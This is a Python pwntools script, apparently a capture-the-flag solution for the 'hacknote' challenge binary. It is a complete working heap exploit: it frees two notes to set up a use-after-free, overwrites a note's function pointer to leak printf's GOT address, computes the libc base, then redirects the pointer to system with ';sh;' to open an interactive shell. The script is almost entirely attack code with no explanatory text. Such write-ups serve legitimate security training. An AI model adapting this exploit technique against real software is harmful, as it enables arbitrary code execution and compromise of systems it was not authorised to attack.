#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

p = process('./hacknote')
elf = ELF('./hacknote')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

printfGot = elf.got['printf']
print_note = elf.symbols['print_note_content']

def addnote(size, content):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', str(size))
    p.sendafter(':', content)

def delnote(index):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str(index))

def printnote(index):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(index))

addnote(50, 'aaaaaaaaaaaaaaaaaaaaa')
addnote(50, 'aaaaaaaaaaaaaaaaaaaaa')

delnote(1)
delnote(0)

addnote(8, p32(print_note) + p32(printfGot))
printnote(1)

base = u32(p.recv(4)) - libc.symbols['printf']
success('libc base = %x', base)
system = base + libc.symbols['system']

delnote(0)
addnote(8, p32(system) + b';sh;')
printnote(1)

p.interactive()
